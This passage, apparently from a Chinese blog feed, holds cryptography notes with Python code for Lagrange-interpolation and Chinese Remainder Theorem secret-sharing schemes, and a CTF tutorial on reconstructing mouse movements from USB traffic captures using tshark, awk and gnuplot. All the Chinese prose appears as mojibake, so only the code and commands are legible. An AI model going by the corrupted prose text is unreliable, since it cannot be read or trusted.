<span class="hljs-comment"># è®¡ç®—åˆ†æ¯</span><br>re = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> others:<br>re *= (x-i)<br><br><span class="hljs-keyword">return</span> re<br></code></pre></td></tr></table></figure><p>å¾…è®¡ç®—å¥½è¿”å›æ¯ä¸€ä¸ª <code>Di</code> çš„åˆ†å­å’Œåˆ†æ¯åï¼Œå³å¯ä»¥è®¡ç®— <code>i</code> æ¨¡ <code>p</code> çš„é€†å…ƒï¼Œåˆ©ç”¨ <code>gmpy2.invert</code> æ¥è®¡ç®—ï¼Œæ±‚å‡ºåå°†å„é¡¹ç›¸åŠ ï¼Œå³æ˜¯å¤šé¡¹å¼æ–¹ç¨‹ï¼Œå…¶ä¸­å¸¸æ•°é¡¹ä½ç§˜å¯†ï¼Œå¯åˆ©ç”¨ <code>libnum.n2s()</code> æ¢å¤æˆå­—ç¬¦ä¸²ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_secret</span>(<span class="hljs-params">k, p, D</span>):<br>re = l(D)<br>cnt = <span class="hljs-number">0</span><br>fz, fm = <span class="hljs-built_in">zip</span>(*re)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>inv = gmpy2.invert(fm[i], p)<br>cnt += D[i][-<span class="hljs-number">1</span>] * inv * fz[i][-<span class="hljs-number">1</span>]<br>cnt %= p<br><br><span class="hljs-keyword">return</span> libnum.n2s(cnt)<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ä¸Šé¢çš„ç§˜å¯†åˆ†å‘çš„æ•°æ®è¿›è¡Œæ¢å¤ï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">å¦‚ï¼š<br><span class="hljs-symbol">Prime:</span> <span class="hljs-number">167569419418447</span><br><span class="hljs-symbol">Subset:</span> <span class="hljs-number">3</span><br><span class="hljs-symbol">D2:</span>(<span class="hljs-number">2</span>, <span class="hljs-number">59529348878006</span>)<br><span class="hljs-symbol">D4:</span>(<span class="hljs-number">4</span>, <span class="hljs-number">21970926061031</span>)<br><span class="hljs-symbol">D5:</span>(<span class="hljs-number">5</span>, <span class="hljs-number">35309714193955</span>)<br></code></pre></td></tr></table></figure><p>æ•ˆæœå›¾å¦‚ä¸‹ï¼š</p><p><img src="https://img.tucang.cc/api/image/show/e8cf2aeb097cb17e936ec8b20e8bd307" alt="image-20200921211306075"></p>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸­å›½å‰©ä½™å®šç†çš„ (k, n) é—¨é™æ–¹æ¡ˆ</title>
    <link href="/2020/09/21/crt/"/>
    <url>/2020/09/21/crt/</url>
    
    <content type="html"><![CDATA[<h1 id="ç§˜å¯†åˆ†å‘"><a href="#ç§˜å¯†åˆ†å‘" class="headerlink" title="ç§˜å¯†åˆ†å‘"></a>ç§˜å¯†åˆ†å‘</h1><p>ç§˜å¯† D è¾“å…¥ï¼Œkï¼Œnçš„è¾“å…¥å’Œ p çš„è·å–å’Œä¸Šé¢ä¸€æ ·ï¼Œè¿™é‡Œä¸å¤šè¯´ï¼Œè·å–å®Œåï¼Œè¦ç”Ÿæˆä¸€ä¸ªé›†åˆ Dï¼Œå…¶ä¸­æœ‰ n ä¸ª <code>di</code>ï¼Œä¸”æ»¡è¶³æ¡ä»¶</p><ol><li>p &gt; D</li><li><code>d1&lt;d2&lt;...&lt;dn</code></li><li>p ä¸ä»»æ„ <code>di</code> äº’ç´ </li><li><code>di</code> ä¹‹é—´ä¸¤ä¸¤äº’ç´ </li><li>æœ€å°çš„ k ä¸ª <code>di</code> çš„ä¹˜ç§¯ &gt; p ä¸ æœ€å¤§çš„ k-1 ä¸ª <code>di</code> çš„ä¹˜ç§¯</li></ol><p>è¿™é‡Œé‡‡å–çš„æ–¹æ³•æ˜¯</p><ol><li>è¿˜æ˜¯ç”¨ <code>getPrime</code> å‡½æ•°ï¼Œå‚æ•°å­—èŠ‚æ•°ä¸º max(Då­—èŠ‚æ•°ï¼Œnå­—èŠ‚æ•°) + 2ï¼Œå¹¶åœ¨åé¢åˆ¤æ–­è‹¥p&lt;Dæˆ–nï¼Œé‡æ–°å–å€¼ï¼Œä¿è¯ p &gt; D,n</li><li>ç”¨ <code>getPrime</code> å‡½æ•°å– n ä¸ªç´ æ•°ï¼Œç„¶åè¿›è¡Œ <code>sort()</code> æ’åˆ—ï¼Œç´ æ•°é—´ä¸€å®šä¸¤ä¸¤äº’ç´ ï¼Œè§£å†³æ¡ä»¶3ï¼Œ4</li><li>åˆ¤æ–­ â€˜æœ€å°çš„ k ä¸ª <code>di</code> çš„ä¹˜ç§¯ &gt; p ä¸ æœ€å¤§çš„ k-1 ä¸ª <code>di</code> çš„ä¹˜ç§¯â€™ æ˜¯å¦æˆç«‹ï¼Œè‹¥ä¸æˆç«‹ï¼Œé‡æ–°å–å€¼</li></ol><p>ç”Ÿæˆ <code>di</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_d</span>(<span class="hljs-params">bit, n</span>): <span class="hljs-comment"># ç”Ÿæˆdåºåˆ—</span><br>d = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>tmp = getPrime(<span class="hljs-built_in">int</span>(bit) + <span class="hljs-number">3</span>)<br><span class="hljs-keyword">if</span> tmp <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> d:<br>d.append(tmp)<br><span class="hljs-keyword">else</span>:<br>i -= <span class="hljs-number">1</span><br>d.sort()<br><br><span class="hljs-keyword">return</span> d<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆå®Œä¹‹åè¿›è¡Œæ£€æŸ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">d, p, k, n</span>): <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦ç¬¦åˆæ¡ä»¶</span><br>mm = p <span class="hljs-comment"># pä¸æœ€å¤§çš„k-1ä¸ªdiçš„ä¹˜ç§¯</span><br>m = getM(d, k)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n-k+<span class="hljs-number">1</span>, n):<br>mm *= d[i]<br><span class="hljs-keyword">if</span>(m &gt; mm):<br><span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getM</span>(<span class="hljs-params">d, k</span>): <span class="hljs-comment"># kä¸ªæœ€å°diçš„ä¹˜ç§¯</span><br>m = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>m *= d[i]<br><span class="hljs-keyword">return</span> m<br><br><br>d = make_d(bit, n)<br><span class="hljs-keyword">while</span> (<span class="hljs-keyword">not</span> check(d, p, k, n)):<br>d = make_d(bit, n)<br><span class="hljs-built_in">print</span>(d)<br></code></pre></td></tr></table></figure><p>åœ¨ <code>[0,(m/p)-1]</code> çš„èŒƒå›´å†…éšæœºå–ä¸€ä¸ª rï¼Œè®¡ç®— <code>D&#39; = D + rp</code>ï¼Œæœ€åè®¡ç®—å‡º n ä¸ª $Di$ å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">m = getM(d, k)<br>rand = random.randint(<span class="hljs-number">0</span>, m//p-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r:&quot;</span>, rand)<br><br>_D = D + rand*p<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br><span class="hljs-built_in">print</span>((_D % d[i], d[i]))<br></code></pre></td></tr></table></figure><p>åªè¦çŸ¥é“ä¸Šè¿° <code>Di</code> å—ä¸­çš„ä»»æ„ k ä¸ªï¼Œå°±å¯ä»¥åº”ç”¨ä¸­å›½å‰©ä½™å®šç†æ±‚å‡º Dâ€™ã€‚</p><p>å…¬å¼€ p å’Œ rï¼Œå¹¶åˆ†å‘æ¯ä¸€ä»½æ•°æ®ç»™æ¯ä¸ªç§˜å¯†å…±äº«è€…ã€‚</p><p>æ•ˆæœå›¾ï¼š</p><p><img src="https://img.tucang.cc/api/image/show/f6dfec7277efc4de3bdb6b6947a82a79" alt="image-20200922095121102"></p><h1 id="ç§˜å¯†æ¢å¤"><a href="#ç§˜å¯†æ¢å¤" class="headerlink" title="ç§˜å¯†æ¢å¤"></a>ç§˜å¯†æ¢å¤</h1><p>è¾“å…¥ kï¼Œp å’Œæ¯ä¸€ä»½ <code>Di</code>ï¼Œè®¡ç®—å‡º <code>m = d1d2..dk </code> ï¼Œä¸ºäº†åº”ç”¨ä¸­å›½å‰©ä½™å®šç†ï¼Œé¦–å…ˆæ±‚å‡º <code>inv(m/di, di)</code>ï¼Œå³ <code>m/di</code> ä¸ <code>di</code> çš„é€†å…ƒï¼Œç„¶åè®¡ç®—å‡º ($\sum_{m&#x3D;0}^k \frac{m}{di}yiDi$) mod m</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover</span>():<br>k = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;k: &quot;</span>))<br>rand = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;r: &quot;</span>))<br>p = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Prime: &quot;</span>))<br>m1 = <span class="hljs-number">1</span><br>recoverD = []<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Now to input your point like x,y&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>x, y = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Input point &quot;</span> + <span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>) + <span class="hljs-string">&quot;: &quot;</span>).split(<span class="hljs-string">&#x27;,&#x27;</span>))<br>recoverD.append((x, y))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> recoverD:<br>m1 *= i[<span class="hljs-number">1</span>]<br>result = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> recoverD:<br>y = gmpy2.invert(m1//i[<span class="hljs-number">1</span>], i[<span class="hljs-number">1</span>])<br>result += m1//i[<span class="hljs-number">1</span>]*y*i[<span class="hljs-number">0</span>]<br><br>DD = result % m1<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;===============Result===============&quot;</span>)<br><span class="hljs-built_in">print</span>(libnum.n2s(DD-rand*p))<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ä¸Šé¢çš„æ•°æ®è¿›è¡Œè®¡ç®—ï¼š</p><p><img src="https://img.tucang.cc/api/image/show/d8baa8f5fd075574a4f96604e555fb7a" alt="image-20200922095249345"></p>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>USBæµé‡æ•°æ®åŒ…çš„å–è¯åˆæ¢ä»¥åŠCTFä¸­çš„è§£é¢˜åº”ç”¨</title>
    <link href="/2020/09/20/usb_forensics/"/>
    <url>/2020/09/20/usb_forensics/</url>
    
    <content type="html"><![CDATA[<p>æœ‰å…³<code>USB</code>åè®®çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚è§<code>wikishark</code> <code>wiki</code>ï¼š<a href="https://wiki.wireshark.org/USB">https</a> : <a href="https://wiki.wireshark.org/USB">&#x2F;&#x2F;wiki.wireshark.org&#x2F;USB</a></p><ul><li><p>é¼ æ ‡æµé‡å–è¯</p><blockquote><p>æ¯ä¸ªæ•°æ®åŒ…çš„æ•°æ®åŒºæœ‰å››ä¸ªå­—èŠ‚ã€‚ç¬¬ä¸€ä¸ªå­—èŠ‚ä»£è¡¨æŒ‰é’®ã€‚å–0x00æ—¶ï¼Œè¡¨ç¤ºæ²¡æœ‰æŒ‰é’®ã€‚ä¸º0x01æ—¶ï¼Œè¡¨ç¤ºå·¦é”®ã€‚å½“å®ƒæ˜¯0x02æ—¶ï¼Œè¡¨ç¤ºå½“å‰æŒ‰é’®æ˜¯å³é”®ã€‚ç¬¬äºŒä¸ªå­—èŠ‚å¯ä»¥è¢«è®¤ä¸ºæ˜¯å¸¦ç¬¦å·çš„å­—èŠ‚ç±»å‹ï¼Œæœ€é«˜ä½æ˜¯ç¬¦å·ä½ã€‚å½“è¯¥å€¼ä¸ºæ­£æ—¶ï¼Œè¡¨ç¤ºé¼ æ ‡æ°´å¹³å‘å³ç§»åŠ¨å¤šå°‘åƒç´ ã€‚å½“å®ƒä¸ºè´Ÿæ•°æ—¶ï¼Œè¡¨ç¤ºå‘å·¦ç§»åŠ¨äº†å¤šå°‘åƒç´ ã€‚ç¬¬ä¸‰ä¸ªå­—èŠ‚ç±»ä¼¼äºç¬¬äºŒä¸ªå­—èŠ‚ï¼Œä»£è¡¨å‚ç›´å‘ä¸Šå’Œå‘ä¸‹ç§»åŠ¨çš„åç§»é‡ã€‚</p></blockquote><p>å½“è·å–äº†è¿™äº›ç‚¹çš„ä¿¡æ¯ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ¢å¤é¼ æ ‡çš„è½¨è¿¹ã€‚</p><p>è¦æƒ³æœ‰æµé‡åŒ…ï¼Œå¿…é¡»å…ˆå¾—æƒ³åŠæ³•æŠ“åŒ…ï¼ŒUSBæµé‡çš„æ•è·å¯ä»¥ä½¿ç”¨wiresharkæˆ–è€…usbpcapæ¥è¿›è¡Œï¼Œæœ€æ–°ç‰ˆæœ¬çš„wiresharkå·²ç»æ”¯æŒUSBæ¥å£çš„æ•è·ï¼Œä¸”åœ¨å®‰è£…æ—¶ä¼šæç¤ºusbpcapçš„å®‰è£…ï¼Œå½“å‰ç½‘ä¸Šå·²æœ‰ç›¸å…³ä¸­æ–‡èµ„æ–™å¯¹wiresharkæŠ“å–usbæ•°æ®åŒ…çš„æ–¹æ³•è¿›è¡Œè®²è§£ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥é˜…è¯»å‚è€ƒé“¾æ¥ã€‚è¯¥è½¯ä»¶çš„ä¸‹è½½åœ°å€ä¸º <code>http://desowin.org/usbpcap/</code>ï¼Œå¯æ”¯æŒ32ä½ä»¥åŠ64ä½çš„winxpè‡³win10æ“ä½œç³»ç»Ÿï¼Œå®‰è£…å®Œæˆåé¡»é‡å¯æœºå™¨æˆ–è€…æŒ‰ç…§æç¤ºé€‰æ‹©é‡å¯æ‰€æœ‰USBè®¾å¤‡ã€‚</p><p>æˆ‘ä»¬ä»¥è‡ªå·±é¼ æ ‡ä¸ºä¾‹ï¼Œæ‰“å¼€wiresharkï¼Œé€‰å–æˆ‘ä»¬usbçš„ç›‘å¬</p><p><img src="https://img.tucang.cc/api/image/show/7f8b39853abac3ce3fea89f588dfcd9b" alt="image-20200920223057765"></p><p>ç„¶åç”¨é¼ æ ‡è¿›è¡Œæ»‘åŠ¨ç­‰æ“ä½œï¼Œå½“ç„¶ç‚¹å‡»å·¦é”®å’Œå³é”®éƒ½æ˜¯æœ‰ä¸ä¸€æ ·çš„æ•°æ®ã€‚</p><p><img src="https://img.tucang.cc/api/image/show/fc664c22a3ffdd7cf9b66354f85f64b8" alt="image-20200920222857520"></p><p>æŠ“å–åˆ°åæˆ‘ä»¬ä¿å­˜æµé‡åŒ…ï¼Œè¿™é‡Œä¿å­˜ä¸º <code>mice.pcapng</code>ï¼Œæˆ‘ä»¬å…ˆæ¥åˆ†æä¸€ä¸‹è¿™ä¸ªæµé‡åŒ…ã€‚</p><p>å› ä¸ºæœ¬æ¥å°±æ’ç€é¼ æ ‡ï¼Œæˆ‘ä»¬æŠ“å–çš„æµé‡ä¹Ÿçœ‹ä¸åˆ°è®¤è¯å§‹åˆ«ä¹‹ç±»çš„æµé‡ï¼Œåç»­åœ¨å…·ä½“é¢˜ç›®ä¸­ä¼šæœ‰æåˆ°ã€‚</p><p><img src="https://img.tucang.cc/api/image/show/38974d13205a371f2e669e850be2db1f" alt="image-20200920225040744"></p><p>ä¸åŒçš„é¼ æ ‡æŠ“åˆ°çš„æµé‡ä¸ä¸€æ ·ï¼Œä¸€èˆ¬çš„é¼ æ ‡æµé‡æ˜¯å››ä¸ªå­—èŠ‚ï¼Œäº‹å®ä¸Šï¼Œèµ·ä½œç”¨çš„åªæ˜¯ä¸‰ä¸ªç›¸é‚»çš„å­—èŠ‚ï¼Œæ¯”å¦‚æˆ‘è¿™é‡ŒæŠ“åˆ°çš„æ˜¯5ä¸ªå­—èŠ‚ï¼Œå¯ä»¥è§‚å¯Ÿçœ‹åˆ°èµ·ä½œç”¨çš„æ˜¯2ï¼Œ3ï¼Œ4ä¸ªå­—èŠ‚ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ“ä½œçš„æ•°æ®åœ¨ 01<code>00fffb</code>00ä¸Šã€‚</p><p>tshark å®‰è£…:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt-get install tshark -y<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ tshark å¯¹æ•°æ®è¿›è¡Œæå–ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ tshark -r mice.pcapng -T fields -e usb.capdata &gt; micedata<br></code></pre></td></tr></table></figure><p>å¯¹ tshark æ›´è¯¦ç»†çš„å‘½ä»¤ï¼Œå‚è€ƒ <a href="https://www.wireshark.org/docs/man-pages/tshark.html">https://www.wireshark.org/docs/man-pages/tshark.html</a></p><p><img src="https://img.tucang.cc/api/image/show/f60388b58ee8022c1e8ff9dfc662f08e" alt="image-20200920225420561"></p><p>æ•°æ®å¤§æ¦‚æ˜¯é•¿è¿™æ ·å­çš„</p><p><img src="https://img.tucang.cc/api/image/show/5d59dea4f9d0e663f104280e180a0bd7" alt="image-20200920225505545"></p><p>è¿™é‡Œæä¸€ä¸‹ï¼Œæµ‹è¯•å‘ç°ï¼Œåœ¨Kaliï¼ŒWindowsé‡Œé¢æå–çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå‡ºç°æ²¡æœ‰å†’å·çš„æƒ…å†µï¼Œè¿™æ ·åæœŸç”¨è„šæœ¬å¤„ç†çš„æ—¶å€™å°±å¾—ä¿®æ”¹ä¸€ä¸‹ï¼Œå¤§æ¦‚æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ï¼Œåœ¨Ubuntu 16.04é‡Œï¼Œapt é»˜è®¤å®‰è£…çš„ tshark æ˜¯</p><p><img src="https://img.tucang.cc/api/image/show/fa0ec48e3cfdd4d1940611bb560d70a8" alt="image-20200920225626489"></p><p>è€Œåœ¨Kaliå’ŒWindowsé‡Œï¼ˆè¿™é‡Œä»¥Windowsä¸ºä¾‹ï¼‰ï¼Œç‰ˆæœ¬å¯èƒ½æ¯”è¾ƒæ–°</p><p><img src="https://img.tucang.cc/api/image/show/a60264fb90dcc2218922aedf22037ec6" alt="image-20200920225746114"></p><p>æå–çš„æ•°æ®å¤§æ¦‚é•¿è¿™æ ·çš„ï¼š</p><p><img src="https://img.tucang.cc/api/image/show/1a1dd86f1db5dc9b714feb6d30e1cd72" alt="image-20200920225902708"></p><p>ä¸å½±å“åˆ†æï¼Œä½†å¦‚æœä½¿ç”¨åˆ«äººçš„è„šæœ¬æˆ–è€…ä»£ç ï¼Œè½¯ä»¶æ—¶è®°å¾—æ ¹æ®è‡ªå·±çš„æƒ…å†µä¿®æ”¹ã€‚</p><p>æå–è„šæœ¬åï¼Œæˆ‘ä»¬å¯¹éœ€è¦çš„æ•°æ®ä½è¿›è¡Œä¸€ä¸ªè§£æï¼Œé€šè¿‡å®ƒçš„æ–¹å‘ï¼Œåç§»é‡ï¼Œæˆ‘ä»¬å¾—è®¡ç®—å‡ºå®ƒçš„åƒç´ ç‚¹ä½ç½®ï¼Œç„¶åå€ŸåŠ© <code>gnuplot</code> ç­‰ç»˜å›¾å·¥å…·è¿›è¡Œæ¢å¤ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">awk -F: <span class="hljs-string">&#x27;function comp(v)&#123;if(v&gt;127)v-=256;return v&#125;&#123;x+=comp(strtonum(&quot;0x&quot;$3));y+=comp(strtonum(&quot;0x&quot;$4))&#125;$2==&quot;01&quot;&#123;print x,y&#125;&#x27;</span> micedata &gt; pointdata<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°†æˆ‘ä»¬çš„æ•°æ®å¤„ç†å¥½ï¼Œä»¥ç‚¹çš„æ–¹å¼ä¿å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œå¦‚æœå‡ºç°ç±»ä¼¼è¿™æ ·çš„é”™è¯¯ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">awk: line 2: <span class="hljs-keyword">function</span> strtonum never defined<br></code></pre></td></tr></table></figure><p>å®‰è£…ä¸€ä¸‹ awk å³å¯ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo apt-get install gawk<br></code></pre></td></tr></table></figure><p>å¤„ç†åçš„æ•°æ®å¤§æ¦‚é•¿è¿™æ ·çš„ï¼š</p><p><img src="https://img.tucang.cc/api/image/show/a2c39d37da48dcd68ea39ec8ad935a2e" alt="image-20200920231252178"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ <code>gnuplot</code> æ¥è¿›è¡Œç»˜åˆ¶ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-variable">$gnuplot</span><br>G N U P L O T<br>Version 5.0 patchlevel 3    last modified 2016-02-21 <br>Copyright (C) 1986-1993, 1998, 2004, 2007-2016<br>Thomas Williams, Colin Kelley and many others<br>gnuplot home:     http://www.gnuplot.info<br>faq, bugs, etc:   <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;help FAQ&quot;</span><br>immediate <span class="hljs-built_in">help</span>:   <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;help&quot;</span>  (plot window: hit <span class="hljs-string">&#x27;h&#x27;</span>)<br>Terminal <span class="hljs-built_in">type</span> <span class="hljs-built_in">set</span> to <span class="hljs-string">&#x27;qt&#x27;</span><br>gnuplot&gt; plot <span class="hljs-string">&quot;pointdata&quot;</span><br></code></pre></td></tr></table></figure><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é¼ æ ‡çš„è½¨è¿¹äº†</p><p><img src="https://img.tucang.cc/api/image/show/258aa73a0b14607a9637d4579eb94882" alt="image-20200920231516224"></p><p>å½“ç„¶è¿™æ˜¯åç€çš„ï¼Œæˆ‘ä»¬ç”¨ä¸€äº›å›¾ç‰‡å¤„ç†è½¯ä»¶å¤„ç†ä¸€ä¸‹ï¼Œå°±å¯ä»¥çœ‹åˆ°è½¨è¿¹å†…å®¹äº†ï¼Œæ˜¯ä¸€ä¸ª â€˜flagâ€™ å­—æ ·çš„è½¨è¿¹</p><p><img src="https://img.tucang.cc/api/image/show/fb0d19a070a78f7b558af4bfa41ca558" alt="img"></p><p>ç„¶åæˆ‘ä»¬ç”¨ä¸€é“CTFé¢˜æ¥ä¸¾ä¾‹å­ï¼Œé¢˜ç›®æ¥æºï¼š Google CTF 2016ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ ciscn 2020 åä¸­èµ›åŒºçš„miscé¢˜ï¼ˆflagéƒ½æ²¡æ”¹ï¼‰ï¼Œé¢˜ç›®æ•°æ®åŒ…å¯ä»¥åœ¨è¿™è·å–ï¼š<a href="https://rootusers.com/wp-content/uploads/2016/05/capture.pcapng">https://rootusers.com/wp-content/uploads/2016/05/capture.pcapng</a></p><p>æ‰“å¼€æ•°æ®åŒ…è¿›è¡Œåˆ†æï¼Œå¯ä»¥çœ‹åˆ°è®¤è¯ç­‰çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»é‡Œé¢çœ‹åˆ°è¿™ä¸ªè®¾å¤‡çš„ä¿¡æ¯ï¼Œè²Œä¼¼æ˜¯ç½—æŠ€çš„é¼ æ ‡ï¼Œç„¶åæˆ‘ä»¬ç”¨åŒæ ·çš„æ–¹æ³•å¯¹å®ƒçš„usbæ•°æ®è¿›è¡Œæå–ã€‚</p><p><img src="https://img.tucang.cc/api/image/show/5a13bbad13ff258ec155a4d046b1d4c2" alt="image-20200920232138818"></p><p>è¿™é‡Œçš„æ•°æ®æ˜¯å››ä¸ªå­—èŠ‚çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åŸºæœ¬å¯ä»¥åˆ¤æ–­æ˜¯usbé¼ æ ‡çš„å–è¯äº†ã€‚</p><p><img src="https://img.tucang.cc/api/image/show/68051b75ed56488fa42b5f8e81dd7ade" alt="image-20200920232331167"></p><p>æ¥ç€ç”¨ç»˜å›¾å·¥å…·ï¼Œç”»å‡ºæ¥çš„è¿˜æ˜¯åçš„ï¼Œä½†æ˜¯éš¾ä¸å€’ctferã€‚</p><p><img src="https://img.tucang.cc/api/image/show/37443d7ba6103166fa4b92f91f85ba21" alt="image-20200920232437388"></p><p>å¤„ç†è¿‡åæ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://img.tucang.cc/api/image/show/02105d43348243a970f21d816134b948" alt="img"></p><p>å½“ç„¶å¯¹äºé¼ æ ‡usbçš„å–è¯ä¹Ÿæœ‰ä¸€äº›è„šæœ¬å¯ä»¥ä½¿ç”¨ï¼Œæ¯”å¦‚ <code>https://github.com/WangYihang/UsbMiceDataHacker</code></p><p>ä¸‹è½½ <code>git clone https://github.com/WangYihang/UsbMiceDataHacker</code></p><p>ä½¿ç”¨ <code>python UsbMiceDataHacker.py capture.pacpng out.png</code> </p><p><img src="https://img.tucang.cc/api/image/show/0f3478a3d7ecdf85e465a9fa0afeb33f" alt="image-20200920232824264"></p><p>ä½¿ç”¨è¿™ä¸ªè„šæœ¬éœ€è¦ä¸‹è½½ä¸€äº›æ¨¡å—å’Œè½¯ä»¶ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pip install numpy<br>$ pip install matplotlib<br>$ apt-get install 